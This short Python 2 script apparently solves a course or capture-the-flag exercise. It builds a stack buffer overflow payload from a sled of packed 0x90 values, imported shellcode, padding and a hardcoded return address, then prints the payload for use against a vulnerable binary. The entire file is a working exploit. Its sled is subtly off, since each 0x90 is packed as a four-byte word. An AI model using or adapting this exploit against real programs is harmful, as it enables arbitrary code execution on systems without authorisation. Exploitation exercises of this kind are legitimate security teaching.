from struct import pack
from shellcode import shellcode

retadd = 0xbffe9ca9
s = pack("<I", 0x90) * 256 + shellcode + "A" * (1032 + 4 - 256 - len(shellcode)) + pack("<I", retadd)

print s